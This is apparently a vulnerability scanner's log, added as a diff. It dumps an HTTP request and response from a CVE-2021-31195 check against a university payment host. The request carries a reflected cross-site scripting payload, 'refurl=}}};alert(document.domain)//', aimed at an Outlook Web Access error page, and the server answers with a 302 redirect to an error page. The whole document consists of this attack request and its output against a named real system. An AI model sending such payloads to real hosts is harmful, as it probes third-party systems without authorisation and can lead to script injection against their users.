@@ -1,0 +1,28 @@
+[CVE-2021-31195] Dumped HTTP request for https://paymentmanager.unimelb.edu.au/owa/auth/frowny.aspx?app=people&et=ServerError&esrc=MasterPage&te=\&refurl=}}};alert(document.domain)//
+
+
+GET /owa/auth/frowny.aspx?app=people&et=ServerError&esrc=MasterPage&te=\&refurl=}}};alert(document.domain)// HTTP/1.1
+Host: paymentmanager.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+[CVE-2021-31195] Dumped HTTP response https://paymentmanager.unimelb.edu.au/owa/auth/frowny.aspx?app=people&et=ServerError&esrc=MasterPage&te=\&refurl=}}};alert(document.domain)//
+
+HTTP/1.1 302 Found
+Connection: close
+Content-Length: 163
+Content-Type: text/html; charset=utf-8
+Date: Wed, 06 Aug 2025 15:18:06 GMT
+Location: /error.htm?aspxerrorpath=/owa/auth/frowny.aspx
+Strict-Transport-Security: max-age=2592000
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+
+<html><head><title>Object moved</title></head><body>
+<h2>Object moved to <a href="/error.htm?aspxerrorpath=/owa/auth/frowny.aspx">here</a>.</h2>
+</body></html>
+
